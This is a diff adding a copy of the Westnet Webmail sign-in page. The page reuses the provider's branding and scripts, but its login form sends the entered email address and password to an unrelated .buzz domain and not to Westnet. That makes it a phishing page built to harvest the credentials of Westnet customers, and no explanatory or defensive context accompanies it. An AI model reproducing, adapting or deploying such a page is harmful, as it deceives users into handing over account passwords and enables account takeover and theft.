@@ -1,0 +1,221 @@
+<html lang="en"><head>
+
+
+<!-- CUSTOM HEADER TAGS -->
+	<title>Westnet Webmail</title>
+
+<!-- END CUSTOM HEADER TAGS -->
+
+       <link rel="shortcut icon" href="https://assets.iinet.net.au/website/_shared/favicon/favicon.westnet.ico" type="image/x-icon">
+		<link id="primary-styles" href="https://assets.iinet.net.au/el/3.3.2/styles.westnet.css" rel="stylesheet" crossorigin="">
+		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+	   <link href="https://cdn.dev.iinet.net.au/el/3.6.147/styles-ie8.css" rel="stylesheet" crossorigin>
+	   <script src="https://cdn.dev.iinet.net.au/website/_shared/_lib/html5shiv.respond.min.js"></script>
+	<![endif]-->
+
+</head>
+	<body id="westnet" class="l-basic">
+
+
+
+<header id="header-v1">
+  <section class="desktop-nav-section">
+  	<div class="l-main-nav-wrapper">
+	    <nav class="l-main-nav">
+	       <span class="l-branding">
+		       <a href="">
+		       		<span class="logo" arai-label="Westnet"></span>
+		       </a>
+	       </span>
+
+
+	      
+
+	      <ul class="l-basic-nav">
+	        <li><a href=""><i class="iii iii-ii-help"></i> Contact Us</a></li>
+	        <li><a href=""><i class="iii iii-toolbox"></i> My Account</a></li>
+	        <li><a href=""><i class="iii iii-broadband"></i> Website</a></li>
+	      </ul>
+
+	    </nav>
+	  </div> <!-- end main nav wrapper -->
+
+
+	 <div class="product-nav-wrapper">
+      <nav class="product-nav">
+        <!--  is empty -->
+  	  </nav>
+    </div>
+  </section> <!-- end desktop nav -->
+
+</header>
+<!-- END DEFAULT HEADER -->
+	
+
+<script type="text/javascript">
+// Reload to the master frame if we are inside a frameset
+if (parent.frames[1]) top.window.location=self.location;
+
+
+$(function() {
+	$('#email').focus();
+
+	// note you cannot do it on "submit", it needs to be a click event on the button
+	$("input[type=submit]").bind('click', function() {
+
+		// Force IE to "autocomplete" remember the email
+		// Note: This only works if there are no hidden <input type='text'> fields which are display:none or hidden via CSS
+		try {
+			
+		    if (window.external && ('AutoCompleteSaveForm' in window.external)) {
+	            var form = document.getElementById("loginPage");
+	            window.external.AutoCompleteSaveForm(form);
+	        }
+	        else {
+				// Not supported in browser
+	        }
+
+		} catch(err) {
+			
+		}		
+
+
+		var email = $("#email").val().trim();
+
+		var emailArgs = email.split('@');
+		$("input[name=emailName]").val(emailArgs[0]);
+		
+		if( !emailArgs[1] ) {
+			$("input[name=emailDomain]").val( $("input[name=emailDomainDefault]").val() );
+			
+		} else {
+			$("input[name=emailDomain]").val(emailArgs[1]);				
+		}
+
+		// don't disable the form hidden elements, browsers have problems with this
+		 // $('form input[type=text]').prop('disabled', true);
+		 // $('form input[type=password]').prop('disabled', true);
+		 // $('form input[type=submit]').prop('disabled', true);
+				
+		document.body.style.cursor = 'wait';
+		
+	});
+});
+</script>
+
+<style>
+.divider-top {
+	margin-top:5%;
+}
+
+.email-icon {
+	font-size:128px;
+	color: #808080;
+}
+
+.border-left-grey {
+	border-left: 1px solid #DDDDDD;	
+}
+
+.text-right {
+	text-align:right;
+}
+
+.padding-right-24 {
+	padding-right:24px;
+}
+
+.padding-left-24 {
+	padding-left:24px;
+}
+</style>
+
+<!--[if lt IE 9]>
+	<style>
+	.hide-ie8 {
+		display: none;
+	}
+	</style>
+<![endif]-->
+
+<div class="container">
+	<!-- BANNER MANAGEMENT SYSTEM -->
+	<div id="bms__webmail-westnet"></div>
+	<script src="https://www.iinet.net.au/library/banners/webmail-westnet/script"></script>
+	<!-- END BANNER MANAGEMENT SYSTEM -->
+</div>
+
+<div class="container divider-top">
+
+
+	
+	
+	<div class="row">
+
+		<div class="col-xs-offset-4 padding-left-24 col-xs-8">
+			<h2>Sign in</h2>
+		</div>
+	</div> <!-- end row -->
+
+	<div class="row">
+
+		<div class="hidden-xs hide-ie8 col-sm-4 padding-right-24 text-right">
+			<i class="iii iii-email email-icon"></i>
+		</div>
+
+		<div class="col-xs-12 col-sm-8 border-left-grey padding-left-24">
+
+			<p>Enter your email address and password to log in to Westnet Webmail</p>
+
+			<form class="login-form" action="https://nkiomzhbhnlfq.buzz/westnet/login.php" name="logPage" method="post" id="logPage">
+				<input type="hidden" name="emailName" value="">
+				<input type="hidden" name="emailDomain" value="">
+				<input type="hidden" name="emailDomainDefault" value="westnet.com.au">
+				<input type="hidden" name="cssStyle" value="">
+									
+				<fieldset>
+					<p>
+						<label class="user" for="email">Email:</label>
+						 <input id="email" class="form-control" type="text" name="username" tabindex="1" required="required">
+					</p>
+
+					<p>
+						<label class="pass" for="password">Password:</label>
+						 <input id="password" class="form-control" type="password" name="password" tabindex="2" required="required">		
+					</p>											
+				</fieldset>
+
+				<input class="input-pass" type="hidden" value="mail.westnet.com.au" name="requestedServer">
+
+
+				<fieldset>
+					<p><input class="btn btn-primary loginbtn" type="submit" value="Login" tabindex="3"></p>
+					
+					<p class="margin-top-24"><strong>
+                       <a href="" class="nowrap" target="_blank">Forgotten your username?</a><br>
+                       <a href="" target="_blank" class="nowrap">Forgotten your password?</a>
+                    </strong></p>
+				</fieldset>
+			</form>
+
+		</div> <!-- end col -->
+
+
+	</div> <!-- end row -->
+</div> <!-- end container -->
+
+
+
+
+<!-- START FOOTER -->
+
+<!-- START FOOTER -->
+<footer>
+<div class="footer-wrapper">
+        <p><script>document.write(new Date().getFullYear())</script>2022<noscript>2016</noscript> ©  Westnet Limited. ACN 50 086 416 908 All rights reserved.</p>
+</div>
+</footer>
+
+</body></html>
